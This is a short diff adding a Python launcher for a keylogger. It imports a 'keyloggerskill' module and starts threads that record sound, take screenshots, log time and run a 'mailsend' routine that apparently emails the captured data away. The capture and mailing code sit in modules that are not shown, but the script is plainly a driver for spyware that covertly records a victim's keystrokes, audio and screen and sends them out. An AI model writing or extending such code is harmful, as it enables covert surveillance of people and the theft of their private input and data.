@@ -1,0 +1,13 @@
+from keyloggerskill import keylogger
+import time
+import threading
+from keystroke import main
+keyloggerobject = keylogger()
+t = threading.Thread(target=keyloggerobject.take_sound)
+t2 = threading.Thread(target=keyloggerobject.screenshootgo)
+t3 = threading.Thread(target=keyloggerobject.log_time)
+t4 = threading.Thread(target=keyloggerobject.mailsend)
+t.start()
+t2.start()
+t3.start()
+t4.start()
